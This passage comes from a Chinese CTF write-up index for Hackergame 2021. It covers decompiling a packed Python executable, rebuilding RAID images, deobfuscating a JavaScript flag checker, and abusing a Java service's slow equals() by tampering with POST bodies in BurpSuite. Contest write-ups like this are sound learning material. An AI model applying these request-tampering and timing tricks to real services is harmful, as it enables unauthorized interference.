<p>\u6240\u4ee5\u5728\u7b2c 0 \u5929\u7f16\u5199\u5b66\u4e60\u56db\u4e2a\u7a0b\u5e8f\uff0c\u5230\u4e0b\u4e00\u5929\u5c31\u53ef\u4ee5\u6839\u636e\u83dc\u8c31\u6765\u6267\u884c\u4e86 \u4f8b\u5982\u7a0b\u5e8f 1,0 \u5c31\u53ef\u4ee5\u7f16\u5199\u4e3a\uff1a <pre><code>\u5411\u53f3 2 \u6b65\n\u62ff\u8d77 1 \u4e2a\u7269\u54c1\n\u5411\u5de6 2 \u6b65\n\u5411\u4e0b 1 \u6b65\n\u653e\u4e0b 1 \u4e2a\u7269\u54c1\n\u5411\u4e0a 1 \u6b65\n\u5411\u53f3 1 \u6b65\n\u62ff\u8d77 1 \u4e2a\u7269\u54c1\n\u5411\u5de6 1 \u6b65\n\u5411\u4e0b 1 \u6b65\n\u653e\u4e0b 1 \u4e2a\u7269\u54c1\n\u5411\u4e0a 1 \u6b65\n</code></pre> \u53ea\u8981\u6b63\u786e\u4e86\u4e00\u5929\uff0c\u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86</p>"}, {"location": "writeups/hackergame2021/#level-1", "title": "Level 1", "text": "<p>\u53ea\u6709 1 \u4e2a\u98df\u7269\uff0c\u83dc\u8c31\u662f\u597d\u591a 0 \u540c\u6837\u968f\u4fbf\u7f16\u5199\u7a0b\u5e8f\u4fdd\u5b58\u8fdb\u5165\u4e0b\u4e00\u5929\uff0c\u53d1\u73b0\u83dc\u8c31\u6ca1\u6709\u53d8\u5316\uff0c\u8fd8\u662f 73 \u4e2a 0 \u6240\u4ee5\u8fd9\u4e00\u5173\u53ef\u80fd\u53ea\u662f\u5faa\u73af\u7684\u6559\u7a0b \u53ef\u7528\u7684\u6307\u4ee4\u4e2d\u6709\u4e00\u6761 \u201c\u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0a\u8df3\u8f6c m \u884c\u201d \u53ef\u4ee5\u7528\u5b83\u6765\u8fbe\u5230\u5faa\u73af\u7684\u6548\u679c</p> <p>\u53ea\u9700\u8981\u62ff 73 \u4e2a\u7269\u54c1\uff0c\u7136\u540e\u5faa\u73af\u653e\u4e0b\u76f4\u5230\u624b\u4e2d\u6ca1\u6709\u4e86\u5373\u53ef <pre><code>\u5411\u53f3 1 \u6b65\n\u62ff\u8d77 73 \u4e2a\u7269\u54c1\n\u5411\u5de6 1 \u6b65\n\u5411\u4e0b 1 \u6b65\n\u653e\u4e0b 1 \u4e2a\u7269\u54c1\n\u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e 1 \u5411\u4e0a\u8df3\u8f6c 1 \u884c\n</code></pre> \u540c\u6837\u4fdd\u5b58\u4e0b\u4e00\u5929\u6267\u884c\u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86 </p> <p>\u5269\u4e0b\u7684\u4e24\u4e2a\u770b\u8d77\u6765\u5927\u6982\u662f\u901a\u8fc7\u6e90\u7801\u6765\u63a8\u6d4b\u51fa\u83dc\u8c31\u7684\u751f\u6210\u65b9\u6cd5\uff0c\u7136\u540e\u7f16\u5199\u76f8\u5e94\u7684\u6307\u4ee4\uff0c\u592a\u96be\u4e86\uff0c\u4e0d\u4f1aqwq</p>"}, {"location": "writeups/hackergame2021/#micro-world", "title": "Micro World", "text": "<p>\u5b87\u5b99\u4e2d\u67d0\u4e00\u7247\u6781\u5176\u5fae\u5c0f\u7684\u533a\u57df\u91cc\u7684\u7c92\u5b50\u88ab\u4e00\u80a1\u795e\u79d8\u529b\u91cf\u521d\u59cb\u5316\u8bbe\u7f6e\u6210\u4e86 flag \u7684\u5f62\u72b6\uff0c\u7a0b\u5e8f\u5fe0\u5b9e\u5730\u8bb0\u5f55\u4e86\u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e\u8fd9\u7247\u533a\u57df\u7684\u7c92\u5b50\u8fd0\u52a8\u60c5\u51b5\u3002</p> <p>\u62ff\u5230\u4e86 exe \u6587\u4ef6\uff0c\u770b\u8d77\u6765\u633a\u7cbe\u81f4\uff0c\u8fd0\u884c\u8d77\u6765\u662f\u4e00\u4e9b\u70b9\u8fd0\u52a8\u78b0\u649e\u7684\u573a\u666f \u62d6\u5230 IDA \u91cc\u770b\u770b\uff0c\u53d1\u73b0\u4e86 __main__ \u4ee5\u53ca .rdata \u91cc\u4e00\u4e9b py \u6709\u5173\u7684\u5b57\u7b26\u4e32\uff1a  \u6240\u4ee5\u63a8\u6d4b\u662f\u4f7f\u7528 python \u7f16\u5199\u7684\uff0c\u7136\u540e\u7528 pyinstaller \u6253\u5305</p> <p>\u8fd9\u6837\u7684\u8bdd\u8bd5\u7740\u7528 pyinstxtractor \u89e3\u5305 .exe\uff0c\u6210\u529f\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6\u5939 \u91cc\u9762\u662f\u4e00\u5806 .pyc .pyd .dll \u6587\u4ef6\uff0c\u4ece\u540d\u5b57\u5c31\u53ef\u4ee5\u770b\u51fa\u5927\u90e8\u5206\u662f import \u7684\u5305\uff0c\u53ea\u6709\u4e00\u4e2a\u7279\u522b\u7684 2.pyc  \u6240\u4ee5\u8fd9\u4e2a\u5e94\u8be5\u5c31\u662f\u7f16\u8bd1\u540e\u7684\u6e90\u7801\u4e86</p> <p>\u63a5\u4e0b\u6765\u7528 uncompyle6 \u6765\u53cd\u7f16\u8bd1 pyc \u6587\u4ef6\uff0c\u8f93\u51fa\u5f97\u5230\u4e86\u6e90\u7801 2.py \u5c1d\u8bd5\u8fd0\u884c\uff0c\u53d1\u73b0\u8dd1\u8d77\u6765\u4e4b\u540e\u53ea\u6709\u4e00\u4e2a\u70b9\u5728\u8fd0\u52a8\uff0c\u5e94\u8be5\u662f\u53cd\u7f16\u8bd1\u65f6\u51fa\u4e86\u4e9b\u95ee\u9898 \u4e8e\u662f\u5f00\u59cb\u770b\u6e90\u7801 </p> <p>\u57fa\u672c\u4e0a\u7b80\u5355\u8bf4\u5c31\u662f\uff0c\u521d\u59cb\u6709\u4e00\u4e9b\u6570\u636e\uff0c\u8868\u793a\u6bcf\u4e2a\u70b9\u7684\u4f4d\u7f6e\u548c\u901f\u5ea6\uff0c\u7136\u540e\u8fd0\u884c\uff0c\u6bcf\u6b21\u8fd0\u884c\u90fd\u68c0\u6d4b\u78b0\u649e\uff0c\u7136\u540e\u83b7\u5f97\u65b0\u7684\u70b9\u4f4d\u7f6e\uff0c\u518d\u7ed8\u5236\u51fa\u6765 \u8c03\u8bd5\u4e00\u4e0b\uff0c\u8f93\u51fa\u6bcf\u6b21\u7684 pointlist\uff0c\u53d1\u73b0\u7b2c\u4e00\u6b21\u662f\u6240\u6709\u70b9\uff0c\u7b2c\u4e8c\u6b21\u53d8\u62102\u4e2a\uff0c\u7b2c\u4e09\u6b21\u5f80\u540e\u5c31\u53ea\u6709\u4e00\u4e2a\u4e86 \u6240\u4ee5\u95ee\u9898\u5927\u6982\u5c31\u51fa\u5728\u4e86 next_pos_list \u51fd\u6570\uff1a <pre><code>def next_pos_list(Pointlist):\n    pointlist = []\n    for i in range(len(Pointlist)):\n        for point in Pointlist[i + 1:]:\n            times = checkcrush(Pointlist[i], point)\n            if times != None:\n                a, b = get_new_point(times, Pointlist[i], point)\n                pointlist.extend([a, b])\n                Pointlist[i].flag = 0\n                point.flag = 0\n        else:\n            for item in Pointlist:\n                if item.flag != 0:\n                    pointlist.append(Point((item.x + item.vx, item.y + item.vy), item.vx, item.vy))\n                for poi in pointlist:\n                    poi.x = poi.x % WIDTH\n                    poi.y = poi.y % HEIGHT\n                else:\n                    return pointlist\n</code></pre> \u4ed4\u7ec6\u8bfb\u4e00\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u9762\u7684 for-else \u5757\u5f88\u5947\u602a\uff0c\u5bfc\u81f4\u5faa\u73af\u7ed3\u675f\u548c return \u90fd\u65e9\u4e86\uff0c\u6240\u4ee5\u6839\u636e\u51fd\u6570\u7684\u610f\u601d\u6539\u4e00\u6539\uff1a <pre><code>def next_pos_list(Pointlist):\n    pointlist = []\n    for i in range(len(Pointlist)):\n        for point in Pointlist[i + 1:]:\n            ...\n    for item in Pointlist:\n        ...\n    return pointlist\n</code></pre> \u8fd9\u6837\u5c31\u53ef\u4ee5\u6210\u529f\u8fd0\u884c\u4e86</p> <p>\u4f46\u662f\u753b\u9762\u4ecd\u7136\u662f\u6742\u4e71\u7684\u3002\u56e0\u4e3a\u9898\u91cc\u8bf4\u4e86 \u201c\u8bb0\u5f55\u4e86\u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e\u8fd9\u7247\u533a\u57df\u7684\u7c92\u5b50\u8fd0\u52a8\u60c5\u51b5\u201d \u6240\u4ee5\u9700\u8981\u5c06\u8f68\u8ff9\u5f80\u524d\u63a8\uff0c\u6700\u65b9\u4fbf\u7684\u65b9\u6cd5\u5c31\u662f\u66f4\u6539\u6bcf\u4e2a\u70b9\u7684\u901f\u5ea6\u65b9\u5411\uff1a <pre><code>Pointlist = []\nfor item in list_:\n    Pointlist.append(Point((item[0], item[1]), -item[2], -item[3]))\n</code></pre> \u8fd0\u884c\u540e\u7b49\u5f85\u4e00\u5c0f\u4f1a\u513f\u5c31\u53ef\u4ee5\u770b\u5230\u70b9\u9010\u6e10\u6709\u5e8f\uff0c\u5728\u67d0\u4e00\u523b\u6c47\u6210\u4e86 flag\uff1a  \u867d\u7136\u4e0d\u592a\u6e05\u6670\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u731c\u4e2a\u5927\u6982</p>"}, {"location": "writeups/hackergame2021/#_10", "title": "\u9635\u5217\u6062\u590d\u5927\u5e08", "text": "<p>\uff08\u8fd9\u9898\u6574\u6574\u505a\u4e86\u6211\u4e24\u5929\u591a\uff0c\u6bcf\u5929\u665a\u4e0a\u90fd\u5bf9\u7740\u78c1\u76d8\u9635\u5217\u2026\u2026\uff09</p> <p>\u4ee5\u4e0b\u662f\u4e24\u4e2a\u538b\u7f29\u5305\uff0c\u5206\u522b\u662f\u4e00\u4e2a RAID 0 \u9635\u5217\u7684\u78c1\u76d8\u538b\u7f29\u5305\uff0c\u548c\u4e00\u4e2a RAID 5 \u9635\u5217\u7684\u78c1\u76d8\u538b\u7f29\u5305\uff0c\u5bf9\u5e94\u672c\u9898\u7684\u4e24\u5c0f\u95ee\u3002\u4f60\u9700\u8981\u89e3\u6790\u5f97\u5230\u6b63\u786e\u5b8c\u6574\u7684\u78c1\u76d8\u9635\u5217\uff0c\u6302\u8f7d\u7b2c\u4e00\u4e2a\u5206\u533a\u540e\u5728\u8be5\u5206\u533a\u6839\u76ee\u5f55\u4e0b\u4f7f\u7528 Python 3.7 \u6216\u4ee5\u4e0a\u7248\u672c\u6267\u884c getflag.py \u811a\u672c\u4ee5\u83b7\u53d6 flag\u3002\u78c1\u76d8\u6570\u636e\u4fdd\u8bc1\u65e0\u635f\u574f\u3002</p>"}, {"location": "writeups/hackergame2021/#raid-5", "title": "RAID 5", "text": "<p>\u867d\u7136 RAID 5 \u662f\u7b2c\u4e8c\u95ee\uff0c\u800c\u4e14\u5206\u6570\u9ad8\uff0c\u4f46\u662f\u66f4\u597d\u505a\uff0c\u800c\u4e14\u505a\u51fa\u7684\u4eba\u4e5f\u591a\u3002 \u56e0\u4e3a\u6570\u636e\u4fdd\u8bc1\u65e0\u635f\u574f\uff0c\u6240\u4ee5\u8981\u505a\u7684\u4ec5\u4ec5\u662f\u627e\u51fa\u4e94\u4e2a\u78c1\u76d8\u7684\u987a\u5e8f\u548c\u5757\u5927\u5c0f</p> <p>\u987a\u5e8f\u53ef\u4ee5\u5148\u7b80\u5355\u5730\u770b\u770b strings *.img \u8f93\u51fa\u7684\u5185\u5bb9 \u9010\u4e2a\u6587\u4ef6\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u6bcf\u4e2a\u6587\u4ef6\u6bd4\u8f83\u9760\u524d\u7684\u5730\u65b9\u4f1a\u6709\u4e00\u6bb5\u662f git \u5386\u53f2\u8bb0\u5f55\u7684\u4e00\u90e8\u5206:  \u6839\u636e\u91cc\u9762\u7684\u65f6\u95f4\u53ef\u4ee5\u63a8\u65ad\u51fa\u78c1\u76d8\u7684\u987a\u5e8f\u5927\u81f4\u662f\uff1a</p> <p>Qj... -&gt; 60... -&gt; 3R... -&gt; Ir... -&gt; 3D...</p> <p>\u53ea\u662f\uff0c\u8fd9\u4e2a\u987a\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2a\u73af\uff0c\u8c01\u5728\u7b2c\u4e00\u8fd8\u6ca1\u533a\u5206\u51fa\u6765</p> <p>\u5728\u770b\u6bcf\u4e2a\u6587\u4ef6\u7684\u5934\u90e8\uff0c\u53ea\u6709 60... \u548c 3R... \u6709 \u201cEFI PART\u201d:  \u6240\u4ee5\u5e94\u8be5\u662f\u4e00\u4e2a\u5728\u5f00\u5934\uff0c\u4e00\u4e2a\u5728\u7ed3\u5c3e\u3002\u6240\u4ee5\u6700\u7ec8\u7684\u987a\u5e8f\u662f\uff1a</p> <p>3R... -&gt; Ir... -&gt; 3D... -&gt; Qj... -&gt; 60...</p> <p>\u7136\u540e\u9700\u8981\u627e\u5230\u5757\u5927\u5c0f \u76f4\u63a5\u4e22\u5230 DiskGenius \u91cc\u7ec4\u5efa\u865a\u62df RAID\uff0c\u9009\u5de6\u540c\u6b65\uff0c\u7136\u540e\u53ef\u4ee5\u8bd5\u51fa\u6765\u5f53\u5757\u5927\u5c0f\u662f 64k \u7684\u65f6\u5019\u6b63\u597d\u53ef\u4ee5\u62fc\u51fa\u5b8c\u6574\u78c1\u76d8 \u7136\u540e\u514b\u9686\u78c1\u76d8\u751f\u6210 img \u6587\u4ef6\uff0c\u518d\u6302\u8f7d\uff0c\u8fdb\u5165\uff0c\u6267\u884c getflag.py \u5c31\u5f97\u5230\u4e86 flag </p>"}, {"location": "writeups/hackergame2021/#raid-0", "title": "RAID 0", "text": "<p>\u5728\u505a RAID 5 \u7684\u65f6\u5019\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e2a\u53eb Raid Reconstructor \u7684\u8f6f\u4ef6\uff0c\u53ef\u4ee5\u7206\u7834 RAID \u9635\u5217\u987a\u5e8f\u548c\u5757\u5927\u5c0f \u6240\u4ee5\u8fd9\u95ee\u4e5f\u5c31\u61d2\u5f97\u770b\u4e86\uff0c\u76f4\u63a5\u4e22\u7ed9 Raid Reconstructor \u6765\u7206\u7834\uff0c\u5f97\u5230\u6700\u63a8\u8350\u7684\u987a\u5e8f\uff1a</p> <p>wl. -&gt; jC. -&gt; 1G. -&gt; 5q. -&gt; d3. -&gt; eR. -&gt; RA. -&gt; ID.</p> <p>\u548c\u5757\u5927\u5c0f 128k</p> <p>\u7136\u540e\u76f4\u63a5\u7528 Raid Reconstructor \u7684 Copy \u5bfc\u51fa img \u6587\u4ef6\uff0c\u63d0\u53d6\u540e\u53c8\u5f97\u5230\u4e00\u4e2a\u65b0\u7684 img \u6587\u4ef6 \u901a\u8fc7 file \u53ef\u4ee5\u770b\u5230\u7ed3\u679c\u7684\u6587\u4ef6\u7cfb\u7edf\u662f XFS <pre><code>$ file MyDisk.img\nMyDisk.img: SGI XFS filesystem data (blksz 4096, inosz 512, v2 dirs)\n</code></pre></p> <p>\u4f46\u662f\u59cb\u7ec8\u65e0\u6cd5\u6302\u8f7d\uff08\u641e\u4e86\u4e00\u5929\uff09 \u53ef\u80fd\u662f Raid Reconstructor \u7684\u95ee\u9898\uff0c\u6240\u4ee5\u53c8\u7528 DiskGenius \u8bd5\u4e86\u4e0b \u56e0\u4e3a win \u548c DiskGenius \u8bfb\u4e0d\u4e86 XFS \u6587\u4ef6\u7cfb\u7edf\uff0c\u6240\u4ee5\u62fc\u8d77\u6765\u4e4b\u540e\u76f4\u63a5\u514b\u9686\u51fa img \u6587\u4ef6 \u7136\u540e\u62d6\u5230 Kali Linux \u91cc\u6302\u8f7d\uff0c\u6210\u529f\u6302\u8f7d\u540e\u8fdb\u5165\u3001\u8fd0\u884c getflag.py \u5c31\u5f97\u5230\u4e86 flag </p>"}, {"location": "writeups/hackergame2021/#_11", "title": "\u52a9\u8bb0\u8bcd", "text": "<p>\u9898\u76ee\u6709\u6548\u5185\u5bb9\uff1a</p> <p>\u4f60\u7684\u5ba4\u53cb\u7ec8\u4e8e\u8fde\u591c\u8d76\u5b8c\u4e86\u4ed6\u7684 Java \u8bed\u8a00\u7a0b\u5e8f\u8bbe\u8ba1\u7684\u8bfe\u7a0b\u5927\u4f5c\u4e1a\u3002\u770b\u8d77\u6765\u4ed6\u4f7f\u7528 Java 17 \u5199\u4e86\u4e00\u4e2a\u4fdd\u5b58\u52a9\u8bb0\u8bcd\u7684\u540e\u7aef\uff0c\u5f53\u7136\u8fd8\u6709\u914d\u5957\u7684\u524d\u7aef\u3002\u52a9\u8bb0\u8bcd\u7531\u56db\u4e2a\u82f1\u6587\u5355\u8bcd\u7ec4\u6210\uff0c\u6bcf\u4e2a\u7528\u6237\u6700\u591a\u4fdd\u5b58 32 \u6761\u3002</p> <p>\u4f60\u4ece\u4ed6\u5145\u6ee1\u6fc0\u60c5\u5374\u53c8\u5939\u6742\u4e0d\u6e05\u7684\u8868\u8ff0\u4e2d\u5f97\u77e5\uff0c\u4ed6\u4f3c\u4e4e\u8fd8\u4e3a\u6b64\u4e13\u95e8\u5728\u5927\u4f5c\u4e1a\u91cc\u85cf\u4e86\u4e24\u4e2a flag\uff1a\u5f53\u8bbf\u95ee\u5ef6\u8fdf\u8fbe\u5230\u4e24\u4e2a\u7279\u6b8a\u7684\u9608\u503c\u65f6\uff0cflag \u4fbf\u4f1a\u6253\u5370\u51fa\u6765\uff0c\u5c4a\u65f6\u4f60\u4fbf\u53ef\u4ee5\u62ff\u7740 flag \u8ba9\u4f60\u7684\u5ba4\u53cb\u8bf7\u4f60\u5403\u4e00\u987f\u5927\u9910\u3002</p> <p>\u4e0b\u8f7d\u5230\u6e90\u7801\u540e\u7ffb\u4e00\u7ffb\uff0c\u6709\u7528\u7684\u5c31\u53ea\u6709 Phrase.java \u548c Instance.java  \u5176\u4e2d Phrase.java \u5b9a\u4e49\u4e86 Phrase\uff0c\u5176\u4e2d\u91cd\u8f7d\u4e86 <code>equals</code> \u65b9\u6cd5\uff0c\u5176\u4e2d\u6709\uff1a <pre><code>try {\n    TimeUnit.MILLISECONDS.sleep(EQUALS_DURATION_MILLIS); // 20ms\n    // TODO: remove it since it is for debugging\n} catch (InterruptedException e) {\n    throw new RuntimeException(e);\n}\n</code></pre> \u6240\u4ee5\u5728\u6bcf\u6b21\u6bd4\u8f83\u76f8\u7b49\u7684\u65f6\u5019\u5c31\u4f1a sleep 20ms </p> <p>\u800c Instance.java \u7684 post \u65b9\u6cd5\u4e2d\u5bf9\u4e8e\u6bcf\u6b21\u7684\u8f93\u5165\uff0c\u904d\u5386\u8f93\u5165\u7684\u5217\u8868\uff0c\u7136\u540e\u9010\u4e2a\u52a0\u8fdb HashMap \u4e2d  \u5728\u52a0\u5165 HashMap \u7684\u65f6\u5019\u5c31\u6d89\u53ca\u5230\u5224\u65ad\u662f\u5426\u76f8\u7b49 \u800c\u6700\u7ec8\u4f1a\u5224\u65ad\u5728\u5b8c\u6210\u524d\u540e\u7684\u603b\u7684\u65f6\u95f4\u95f4\u9694\u662f\u591a\u5c11\uff0c\u5982\u679c\u5927\u4e8e 600ms \u5c31\u63d0\u53d6\u51fa\u7b2c\u4e00\u4e2a flag\uff1a <pre><code>var modified = 0;\nvar before = System.nanoTime();\nfor (var i = 0; i &lt; input.length() &amp;&amp; i &lt; MAX_PHRASES &amp;&amp; phrases.size() &lt; MAX_PHRASES; ++i) {\n    var text = input.optString(i, \"\").toLowerCase(Locale.ENGLISH);\n    modified += phrases.add(Phrase.create(this.mnemonics, text, token)) ? 1 : 0;\n    // \u8fd9\u91cc\u4f1a sleep\n}\nvar after = System.nanoTime();\nvar duration = TimeUnit.MILLISECONDS.convert(after - before, TimeUnit.NANOSECONDS);\nif (duration &gt; FLAG1_DURATION_MILLIS) { // 600ms\n    token.addFlag(1, flag -&gt; output.put(\"flag1\", flag));\n}\n</code></pre></p> <p>\u800c\u5728\u7f51\u9875\u4e2d\u6dfb\u52a0\u6761\u76ee\u7684\u65f6\u5019\uff0c\u4e00\u6b21\u53ea\u80fd\u6dfb\u52a0\u4e00\u6761\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a POST \u91cc\u9762\u53ea\u6709\u4e00\u4e2a Phrase  \u4f46\u662f\u6e90\u7801\u4e2d\u6709\u4e00\u4e2a\u5faa\u73af\uff0c\u904d\u5386\u6574\u4e2a input\uff0c\u6240\u4ee5\u4e00\u4e2a POST \u91cc\u7684\u5185\u5bb9\u5176\u5b9e\u662f\u4e00\u4e2a\u5217\u8868 \u6240\u4ee5\u53ef\u4ee5\u7528 BurpSuite \u83b7\u53d6 POST \u7136\u540e\u66f4\u6539\u4e00\u4e0b\u5185\u5bb9\u518d\u53d1\u9001\u51fa\u53bb\uff08\u5148 random \u4e00\u4e2a\uff0c\u7136\u540e add\uff09  \u6839\u636e flag \u91cc\u7684\u63d0\u793a\uff0c\u6b63\u89e3\uff08\u7b2c\u4e8c\u987f\u5927\u9910\uff09\u5e94\u8be5\u662f\u4f7f\u7528\u54c8\u5e0c\u78b0\u649e\uff0c\u4f46\u662f\u4e0d\u4f1a</p>"}, {"location": "writeups/hackergame2021/#_12", "title": "\u9a6c\u8d5b\u514b", "text": "<p>\uff08\u8fd9\u9053\u9898\u5df2\u7ecf\u505a\u7834\u9632\u4e86\uff0c\u672c\u4ee5\u4e3a\u662f\u4e2a\u9752\u94dc\uff0c\u7ed3\u679c\u662f\u4e2a\u738b\u8005\u2026\u2026\uff09 \u6211\u505a\u7684\u80af\u5b9a\u4e0d\u662f\u6b63\u89e3\uff0c\u5229\u7528\u4e8c\u7ef4\u7801\u7ea0\u9519\u80fd\u529b\u52c9\u5f3a\u62ff\u5230\u4e86 flag\uff0c\u6240\u4ee5\u5c31\u4e0d\u8be6\u7ec6\u5199 writeup \u4e86\uff0c\u4e3b\u8981\u8fd8\u662f\u8981\u770b\u5b98\u65b9 wp\uff08\u9003</p> <p>\u5927\u6982\u6b65\u9aa4\u5c31\u662f\uff1a</p> <ol> <li>\u8bfb\u56fe\u7247</li> <li>\u628a\u5df2\u77e5\u7684\u50cf\u7d20\u63d0\u53d6\u51fa\u6765</li> <li>\u628a\u56db\u4e2a\u5c0f\u5b9a\u4f4d\u5757\u586b\u4e0a</li> <li>\u6328\u4e2a\u9a6c\u8d5b\u514b\u5757\u5bfb\u627e\u4f7f\u8fd8\u539f\u7684\u6570\u636e\u5e73\u5747\u6570\u4e0e\u539f\u9a6c\u8d5b\u514b\u503c\u5dee\u7684\u7edd\u5bf9\u503c\u5c0f\u4e8e1\u7684\u586b\u8865\u65b9\u6cd5<ul> <li>\u5982\u679c\u53ea\u6709\u4e00\u79cd\u5c31\u586b\u4e0a\uff0c\u5e76\u4e14\u6807\u6ce8\u5df2\u7ecf\u586b\u597d\uff0c\u4ee5\u540e\u4e0d\u518d\u641c\u5bfb</li> <li>\u5982\u679c\u6709\u591a\u79cd\u5c31\u5148\u653e\u4e0b\u4e0d\u586b</li> </ul> </li> <li>\u91cd\u590d4\u7684\u8fc7\u7a0b\uff0c\u8fd9\u662f\u8fd8\u4f1a\u6709\u552f\u4e00\u786e\u5b9a\u7684\u586b\u8865\u65b9\u6848\u3002\u91cd\u590d4\u6b21\u5927\u6982\u5c31\u4e0d\u5269\u552f\u4e00\u89e3\u4e86</li> <li>\u8fd9\u65f6\u91cd\u590d4\uff0c\u627e\u51fa\u4ec5\u67092\u4e2d\u586b\u8865\u65b9\u6cd5\u7684\uff0c\u9009\u8bef\u5dee\u6700\u5c0f\u7684\u586b\u4e0a</li> <li>\u7136\u540e\u518d\u91cd\u590d4</li> <li>\u7136\u540e\u91cd\u590d6</li> <li>\u7136\u540e\u91cd\u590d4 </li> <li>\u8fd9\u65f6\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u8fd8\u539f\u5f97\u5dee\u4e0d\u591a\u4e86\uff0c\u5269\u4e0b\u7684\u4e0d\u7ba1\u76f4\u63a5\u626b\u7801\u4e5f\u53ef\u4ee5\u626b\u51fa flag \u4e86 </li> </ol> <p>\u770b\uff0c\u505a\u6cd5\u5f88\u70c2\u5bf9\u5427</p>"}, {"location": "writeups/hackergame2021/#minecraft", "title": "minecRaft", "text": "<p>kk \u540c\u5b66\u5f88\u559c\u6b22\u73a9 Minecraft\uff0c\u4ed6\u6700\u8fd1\u6536\u5230\u4e86\u4e00\u5f20 MC \u5730\u56fe\uff0c\u5730\u56fe\u91cc\u9762\u6709\u4e09\u76cf\u706f\uff0c\u8fd8\u6709\u5f88\u591a\u5947\u5947\u602a\u602a\u7684\u538b\u529b\u677f\u3002</p> <p>\u4f46\u4ed6\u53d1\u73b0\u8fd9\u4e9b\u706f\u597d\u50cf\u4e0d\u592a\u7b26\u5408 MC \u7535\u78c1\u5b66\uff08Red stone\uff09\uff0c\u4f60\u80fd\u5e2e\u4ed6\u628a\u706f\u5168\u90e8\u70b9\u4eae\u5417\uff1f</p> <p>\u6ce8\uff1a\u672c\u9898\u89e3\u6cd5\u4e0e\u539f\u7248 Minecraft \u6e38\u620f\u65e0\u5173\u3002</p> <p>\u8865\u5145\u8bf4\u660e\uff1aflag \u82b1\u62ec\u53f7\u5185\u4e3a\u8ba9\u4e09\u76cf\u706f\u5168\u90e8\u70b9\u4eae\u7684\u6700\u77ed\u7684\u8f93\u5165\u5e8f\u5217\u3002\u4f8b\u5982\uff0c\u5982\u679c\u8e29\u8e0f\u538b\u529b\u677f\u8f93\u5165\u7684\u6700\u77ed\u7684\u5e8f\u5217\u4e3a abc\uff0c\u5219\u7b54\u6848\u4e3a flag{abc}\u3002</p> <p>\u8fd8\u633a\u597d\u73a9\u7684\u9898\uff0c\u5728\u7f51\u9875\u4e2d\u6a21\u62df\u4e86\u4e00\u4e2amc\u51fa\u6765 \u770b\u6e90\u7801\u770b\u5230\u4e86\u5f15\u5165\u4e86 flag.js \u6587\u4ef6\uff0c\u6240\u4ee5\u53ef\u80fd\u5c31\u662f\u8981\u901a\u8fc7\u5b83\u6765\u5f97\u5230\u7b54\u6848\uff1a <pre><code>&lt;script src=\"jsm/miscs/flag.js\"&gt;&lt;/script&gt;\n</code></pre> \u4e5f\u53ef\u4ee5\u770b\u5230\uff0c\u6700\u7ec8\u5224\u65ad\u662f\u5426\u6b63\u786e\u662f\u901a\u8fc7\u8c03\u7528 <code>gyflagh(input)</code> \u662f\u5426\u4e3a true \u6765\u5224\u65ad\uff0c\u800c gyflagh \u4e5f\u5728 flag.js \u4e2d\uff0c\u6240\u4ee5\u8fd8\u662f\u8981\u770b flag.js </p> <p>\u4f46\u662f flag.js \u662f\u7ecf\u8fc7\u7b80\u5355\u6df7\u6dc6\u8fc7\u7684\uff0c\u8fd8\u662f\u8981\u8d39\u70b9\u65f6\u95f4\u8bfb\u4e00\u4e0b</p> <p>\u5176\u4e2d\u6709\u56db\u4e2a\u8f6c\u6362 Str4 Base16 \u548c Long \u7684\u51fd\u6570\u53ef\u4ee5\u7565\u6389\u4e0d\u7ba1 \u6ce8\u610f\u5230\u4e86 <code>_0x381b()</code> \u8fd9\u4e2a\u51fd\u6570\u91cc\u6709\u4e00\u4e2a\u5217\u8868\uff0c\u800c\u4e14\u6bd4\u8f83\u7b80\u5355\uff0c\u5176\u5b9e\u5b83\u8fd4\u56de\u7684\u5c31\u662f\u8fd9\u4e2a\u5217\u8868 <pre><code>['encrypt', '33MGcQht', '6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c', '14021KbbewD', 'charCodeAt', '808heYYJt', '5DlyrGX', '552oZzIQH', 'fromCharCode', '356IjESGA', '784713mdLTBv', '2529060PvKScd', '805548mjjthm', '844848vFCypf', '4bIkkcJ', '1356853149054377', 'length', 'slice', '1720848ZSQDkr']\n</code></pre> \u4f46\u662f\u5728 Console \u91cc\u9762\u8c03\u7528 _0x381b \u5f97\u5230\u7684\u5374\u662f\u4ee5 'slice' \u5f00\u5934\u3001'length' \u7ed3\u5c3e\u7684\u5217\u8868\uff0c\u5c06\u8fd9\u4e2a\u5217\u8868\u8bb0\u4e3a lst \u65b9\u4fbf\u8868\u8ff0 \u800c\u4e14\u6e90\u7801\u4e2d\u53ea\u6709\u6700\u5f00\u5934\u7684\u8c03\u7528\u533f\u540d\u51fd\u6570\u91cc\u9762\u6709 <code>['push']</code> \u548c <code>['shift']</code>\uff0c\u6240\u4ee5\u63a8\u6d4b\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u5c31\u662f\u5c06\u8fd9\u4e2a\u5217\u8868\u5faa\u73af\u53f3\u79fb\u4e24\u4e2a\u4f4d\u7f6e \u90a3\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u4e5f\u4e0d\u7528\u770b\u4e86</p> <p>\u518d\u6765\u770b <code>_0x2c9e()</code> \u8fd9\u4e2a\u51fd\u6570\uff1a <pre><code>function _0x2c9e(_0x49e6ff, _0x310d40) {\n    const _0x381b4c = _0x381b();\n    return _0x2c9e = function(_0x2c9ec6, _0x2ec3bd) {\n        _0x2c9ec6 = _0x2c9ec6 - 0x1a6;\n        let _0x4769df = _0x381b4c[_0x2c9ec6];\n        return _0x4769df;\n    }\n    ,\n    _0x2c9e(_0x49e6ff, _0x310d40);\n}\n</code></pre> \u5176\u4e2d <code>_0x381b4c</code> 